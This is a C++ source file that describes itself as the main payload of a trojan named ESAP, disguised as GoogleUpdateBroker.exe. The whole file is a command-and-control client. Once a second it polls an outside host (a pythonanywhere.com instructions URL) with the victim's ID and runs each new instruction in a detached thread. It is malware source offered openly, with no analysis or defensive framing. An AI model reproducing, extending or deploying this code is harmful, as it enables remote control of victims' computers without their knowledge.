/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<_payload.cpp>
This is the main payload that is downloaded by ESAP.exe and disguised as GoogleUpdateBroker.exe

*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <unordered_set>
#include <thread>

#include "request.hpp"
#include "string_functions.hpp"

#include "c2.hpp"
#include "api.hpp"

#include "extern/json.hpp"

#define INSTRUCTION_SEP_TOKEN "%&instructionSEP&%"
#define INSTRUCTION_VAL_SEP_TOKEN "%&valSEP&%"

using json = nlohmann::json;

bool ALIVE = true;

int main() {
    std::cout << "up and running\n";
    std::string id = GetID();
    std::unordered_set<std::string> seenInstructions;
    while (ALIVE) {
        for (std::string ins: SplitString(GET_Request("http://0x3af72.pythonanywhere.com/instructions/?u=" + id), INSTRUCTION_SEP_TOKEN)) {
            if (!ins.size()) continue;
            std::vector<std::string> values = SplitString(ins, INSTRUCTION_VAL_SEP_TOKEN);
            if (values.size() < 2) continue;
            if (seenInstructions.find(values[0]) != seenInstructions.end()) continue;
            seenInstructions.insert(values[0]);
            std::thread t(perform, id, values);
            t.detach();
        }
        Sleep(1000);
    }
    return 0;
}